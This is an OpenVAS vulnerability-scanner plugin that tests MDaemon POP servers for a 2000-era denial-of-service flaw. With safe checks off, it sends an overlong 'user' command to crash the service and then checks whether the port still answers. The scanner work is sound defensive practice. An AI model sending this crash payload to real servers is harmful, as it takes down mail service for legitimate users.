# OpenVAS Vulnerability Test
# $Id: mdaemon_mail_server_dos.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: MDaemon mail server DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running the MDaemon POP server.

It is possible to crash the remote service by sending a too long 'user' 
command. 

This problem allows an attacker to make the remote MDaemon server crash, thus 
preventing legitimate users from receiving e-mails.";

tag_solution = "Upgrade to the newest version of this software";

#  Ref: Cassius <cassius@hushmail.com>

if(description)
{
 script_id(14825);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1250);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_xref(name:"OSVDB", value:"1354");
 script_cve_id("CVE-2000-0399");
 
 name = "MDaemon mail server DoS";
 script_name(name);
 

 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/pop3", 110);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#
include("pop3_func.inc");
port = get_kb_item("Services/pop3");
if(!port)port = 110;

if ( safe_checks() )
{
 banner = get_pop3_banner (  port: port );
 if ( ! banner ) exit(0);
 if(ereg(pattern:".* POP MDaemon ([0-2]\.|0\.3\.[0-3][^0-9])", string:banner))
 	security_message(port);

 exit(0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  banner = recv_line(socket:soc, length:4096);
  if ( "MDaemon" >!< banner ) exit(0);
  s = string("user ", crap(256), "\r\n");
  send(socket:soc, data:s);
  d = recv_line(socket:soc, length:4096);
  s = string("pass killyou\r\n");
  send(socket:soc, data:s);
  close(soc);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_message(port);
  else close(soc2);
 }
}
